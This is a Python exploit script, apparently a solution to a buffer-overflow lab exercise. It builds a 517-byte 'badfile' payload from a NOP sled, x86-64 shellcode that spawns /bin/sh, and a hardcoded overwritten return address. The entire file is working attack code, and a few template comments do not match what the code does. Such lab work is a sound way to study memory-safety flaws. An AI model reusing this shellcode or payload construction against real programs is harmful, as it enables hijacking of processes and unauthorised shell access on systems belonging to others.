#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

off = 0x7fffffffd918 - 0x7fffffffd906
L = 8
BUFF_SIZE = 10

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start =  517 - len(shellcode) # (off + L + 4) // 4 * 4                     # Change this number: 0x1c
print("start of shellcode:", start)
print("offset of ret addr:", off)

content[start:start + len(shellcode)] = shellcode  # this segment will be written to str[]

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x7fffffffdd40 + start               # Change this number: in str[]  
offset = off                                  # Change this number: (ret addr) - (p &buff) 

print("ret addr: %#x" % ret)

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset+L] = (ret).to_bytes(L,byteorder='little')  # just write 0 into content
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
